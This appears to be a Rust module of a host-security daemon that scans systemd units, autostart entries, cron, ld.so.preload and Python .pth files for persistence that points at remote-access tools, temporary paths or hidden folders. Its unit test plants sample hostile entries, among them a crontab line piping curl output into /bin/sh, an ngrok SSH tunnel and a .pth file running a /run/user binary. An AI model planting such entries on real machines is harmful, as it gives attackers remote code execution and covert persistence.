//! Footholds (HEI-11; Go: rasource's footholds.go): what makes a program start again by itself, in the system-wide places
//! Heimdall's daemon can read: systemd units and their drop-ins (/etc/systemd/system, /etc/systemd/user), autostart entries
//! (/etc/xdg/autostart), cron (/etc/crontab, /etc/cron.d), /etc/ld.so.preload and Python's .pth files. One is reported when a
//! path in it is a remote-access tool of the catalog, a program in a temporary place (/tmp, /var/tmp, /dev/shm, /run/user) or
//! one under a hidden folder; any ld.so.preload entry is reported (every program loads it). A file is read again only when
//! its size or time changed. Per-user places are not readable by the daemon and are not watched.

use crate::event::{Event, Fields};
use crate::gotext;
use crate::gotime::Time;
use crate::remoteaccess::Catalog;
use std::collections::{BTreeMap, BTreeSet};

const MAX_FOOTHOLD: u64 = 1 << 20;

#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    Unit,
    Autostart,
    Cron,
    Preload,
    Pth,
}

impl Kind {
    fn word(self) -> &'static str {
        match self {
            Kind::Unit => "service",
            Kind::Autostart => "autostart",
            Kind::Cron => "cron",
            Kind::Preload => "preload",
            Kind::Pth => "pth",
        }
    }
    fn place(self) -> &'static str {
        match self {
            Kind::Unit => "a service",
            Kind::Autostart => "an autostart entry",
            Kind::Cron => "a cron job",
            Kind::Preload => "the preload list",
            Kind::Pth => "a Python startup file",
        }
    }
}

/// The footholds' state (Go: footholdWatch).
#[derive(Default)]
pub struct FootholdWatch {
    /// The root the places are under ("" for /).
    pub root: String,
    seen: BTreeSet<String>,
    stamp: BTreeMap<String, (u64, i128)>,
}

/// The names in `dir` that `keep` accepts, as paths (Go's filepath.Glob of one folder: sorted).
fn names(dir: &str, keep: impl Fn(&str) -> bool) -> Vec<String> {
    let mut v: Vec<String> = std::fs::read_dir(dir)
        .map(|rd| rd.flatten().map(|e| e.file_name().to_string_lossy().into_owned()).filter(|n| keep(n)).collect())
        .unwrap_or_default();
    v.sort();
    v.into_iter().map(|n| format!("{dir}/{n}")).collect()
}

/// Go's footholdCommands: the command lines a file holds, by its kind.
fn commands(kind: Kind, text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for line in text.split('\n') {
        let line = gotext::trim_space(line);
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        match kind {
            Kind::Unit => {
                if let Some((k, v)) = line.split_once('=') {
                    if gotext::trim_space(k).starts_with("Exec") {
                        out.push(v.to_string());
                    }
                }
            }
            Kind::Autostart => {
                if let Some((k, v)) = line.split_once('=') {
                    if matches!(gotext::trim_space(k), "Exec" | "TryExec") {
                        out.push(v.to_string());
                    }
                }
            }
            Kind::Cron => {
                let f: Vec<&str> = gotext::fields(line).collect();
                if f.first().is_some_and(|x| x.contains('=')) {
                    continue;
                }
                let n = if f.first().is_some_and(|x| x.starts_with('@')) { 2 } else { 6 };
                if f.len() > n {
                    out.push(f[n..].join(" "));
                }
            }
            Kind::Preload => out.extend(gotext::fields(line).map(str::to_string)),
            Kind::Pth => {
                if line.starts_with("import ") || line.starts_with("import\t") {
                    out.push(line.to_string());
                }
            }
        }
    }
    out
}

/// Go's pathTokens: the absolute paths in a command line.
fn path_tokens(cmd: &str) -> Vec<String> {
    cmd.split([' ', '\t', '"', '\'', ';', '|', '&', '(', ')', '`', '=', ','])
        .filter(|t| !t.is_empty())
        .map(|t| t.trim_start_matches(['-', '@', '+', '!', ':']))
        .filter(|t| t.starts_with('/'))
        .map(str::to_string)
        .collect()
}

/// Go's whyFoothold: "temporary", "hidden" or "".
fn why(p: &str) -> &'static str {
    if ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/"].iter().any(|t| p.starts_with(t)) {
        return "temporary";
    }
    if p.split('/').any(|c| c.len() > 1 && c.starts_with('.') && c != "..") {
        return "hidden";
    }
    ""
}

impl FootholdWatch {
    /// Go's footholdFiles: the files to look at, sorted, with their kind.
    fn files(&self) -> Vec<(String, Kind)> {
        let root = if self.root.is_empty() { "/".to_string() } else { self.root.clone() };
        let j = |p: &str| format!("{}/{p}", root.trim_end_matches('/'));
        let mut out: Vec<(String, Kind)> = Vec::new();
        for base in [j("etc/systemd/system"), j("etc/systemd/user")] {
            out.extend(names(&base, |n| n.ends_with(".service")).into_iter().map(|p| (p, Kind::Unit)));
            for d in names(&base, |n| n.ends_with(".service.d")) {
                out.extend(names(&d, |n| n.ends_with(".conf")).into_iter().map(|p| (p, Kind::Unit)));
            }
        }
        out.extend(names(&j("etc/xdg/autostart"), |n| n.ends_with(".desktop")).into_iter().map(|p| (p, Kind::Autostart)));
        out.push((j("etc/crontab"), Kind::Cron));
        out.extend(names(&j("etc/cron.d"), |_| true).into_iter().map(|p| (p, Kind::Cron)));
        out.push((j("etc/ld.so.preload"), Kind::Preload));
        for py in names(&j("usr/lib"), |n| n.starts_with("python3")) {
            out.extend(names(&format!("{py}/site-packages"), |n| n.ends_with(".pth")).into_iter().map(|p| (p, Kind::Pth)));
        }
        out.sort_by(|a, b| a.0.cmp(&b.0));
        out
    }

    /// Go's poll: each file's commands that point at a catalog tool, a temporary place or a hidden folder (once per file and
    /// path while the file holds it), and every ld.so.preload entry.
    pub fn poll(&mut self, catalog: &Catalog) -> Vec<Event> {
        let mut out = Vec::new();
        let files = self.files();
        let present: BTreeSet<String> = files.iter().map(|f| f.0.clone()).collect();
        let prefix = self.root.trim_end_matches('/').to_string();
        for (path, kind) in files {
            let md = match std::fs::metadata(&path) {
                Ok(md) if md.is_file() && md.len() <= MAX_FOOTHOLD => md,
                _ => {
                    self.stamp.remove(&path);
                    continue;
                }
            };
            let stamp = (md.len(), super::mtime(&md).unix_nanos());
            if self.stamp.get(&path) == Some(&stamp) {
                continue;
            }
            self.stamp.insert(path.clone(), stamp);
            let Ok(b) = std::fs::read(&path) else { continue };
            let text = gotext::lossy(&b);
            let shown = path.strip_prefix(prefix.as_str()).unwrap_or(&path).to_string();
            self.seen.retain(|k| !k.starts_with(&format!("{path}|")));
            for cmd in commands(kind, &text) {
                for p in path_tokens(&cmd) {
                    let w = why(&p);
                    let prov = catalog.match_exe(&p, "");
                    if w.is_empty() && prov.is_none() && kind != Kind::Preload {
                        continue;
                    }
                    let key = format!("{path}|{p}");
                    if !self.seen.insert(key) {
                        continue;
                    }
                    let mut f = Fields::from([
                        ("signal".to_string(), "foothold".to_string()),
                        ("place".to_string(), kind.word().to_string()),
                        ("file".to_string(), shown.clone()),
                        ("target".to_string(), p.clone()),
                        ("why".to_string(), w.to_string()),
                        ("ra_kind".to_string(), "foothold".to_string()),
                    ]);
                    let mut text = format!("{shown} ({}) points at {p}", kind.place());
                    if kind == Kind::Preload {
                        text = format!("{shown} makes every program load {p}");
                        if w.is_empty() {
                            f.insert("why".into(), "preload".into());
                        }
                    }
                    if let Some(pr) = prov.filter(|_| w.is_empty()) {
                        f.insert("why".into(), "tool".into());
                        f.insert("provider".into(), pr.id.clone());
                        f.insert("provider_name".into(), pr.name.clone());
                        f.insert("ra_kind".into(), pr.kind.clone());
                        text.push_str(&format!(" ({})", pr.name));
                    }
                    out.push(Event {
                        source: "remote-access".into(),
                        session_id: String::new(),
                        time: Time::now(),
                        kind: "remote_access".into(),
                        text,
                        fields: f,
                    });
                }
            }
        }
        self.stamp.retain(|p, _| present.contains(p));
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// HEI-11, Go's TestFootholds on the same made-up root (internal/sources/rasource, plantFootholds): each kind planted
    /// gives one event, the ordinary files none, an unchanged file is not read again, a changed one is.
    #[test]
    fn each_kind_planted_gives_one() {
        let root = std::env::temp_dir().join(format!("heimdall-footholds-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let write = |rel: &str, text: &str| {
            let p = root.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, text).unwrap();
        };
        write("etc/systemd/system/backup.service", "[Service]\nExecStart=/usr/bin/restic backup /home\n");
        write("etc/xdg/autostart/panel.desktop", "[Desktop Entry]\nExec=/usr/bin/yggdrasil-panel\n");
        write("etc/cron.d/logrotate", "SHELL=/bin/sh\n0 3 * * * root /usr/bin/logrotate /etc/logrotate.conf\n");
        write(
            "usr/lib/python3.14/site-packages/distutils-precedence.pth",
            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'\n",
        );
        write(
            "etc/systemd/system/update-helper.service",
            "[Service]\nExecStartPre=-/bin/true\nExecStart=/bin/sh -c \"/tmp/.x/upd --quiet\"\n",
        );
        write("etc/systemd/system/getty@.service.d/override.conf", "[Service]\nExecStart=\nExecStart=/usr/bin/ngrok tcp 22\n");
        write("etc/systemd/user/sync.service", "[Service]\nExecStart=/home/u/.cache/sync/agent\n");
        write("etc/xdg/autostart/helper.desktop", "[Desktop Entry]\nExec=env A=1 /dev/shm/helper\n");
        write("etc/cron.d/clean", "@reboot root /var/tmp/clean.sh\n# 1 1 * * * root /tmp/commented\n");
        write("etc/crontab", "*/5 * * * * root curl -s http://x | /bin/sh\n");
        write("etc/ld.so.preload", "/usr/lib/libcheck.so\n");
        write("usr/lib/python3.14/site-packages/zz.pth", "import os; os.system('/run/user/0/p')\n");
        let mut w = FootholdWatch { root: root.to_string_lossy().into_owned(), ..Default::default() };
        let cat = Catalog::builtin();
        let got: Vec<String> =
            w.poll(&cat).iter().map(|e| format!("{} {} {} | {}", e.f("place"), e.f("why"), e.f("provider"), e.text)).collect();
        assert_eq!(
            got,
            [
                "cron temporary  | /etc/cron.d/clean (a cron job) points at /var/tmp/clean.sh",
                "preload preload  | /etc/ld.so.preload makes every program load /usr/lib/libcheck.so",
                "service tool ngrok | /etc/systemd/system/getty@.service.d/override.conf (a service) points at /usr/bin/ngrok (ngrok)",
                "service temporary  | /etc/systemd/system/update-helper.service (a service) points at /tmp/.x/upd",
                "service hidden  | /etc/systemd/user/sync.service (a service) points at /home/u/.cache/sync/agent",
                "autostart temporary  | /etc/xdg/autostart/helper.desktop (an autostart entry) points at /dev/shm/helper",
                "pth temporary  | /usr/lib/python3.14/site-packages/zz.pth (a Python startup file) points at /run/user/0/p",
            ]
        );
        assert!(w.poll(&cat).is_empty(), "unchanged files are not read again");
        write("etc/systemd/system/update-helper.service", "[Service]\nExecStart=/usr/bin/true\n");
        assert!(w.poll(&cat).is_empty(), "cleaned");
        write("etc/systemd/system/update-helper.service", "[Service]\nExecStart=/tmp/.x/upd --again\n");
        let again = w.poll(&cat);
        assert_eq!(again.len(), 1);
        assert_eq!(again[0].f("target"), "/tmp/.x/upd");
        let _ = std::fs::remove_dir_all(&root);
    }
}
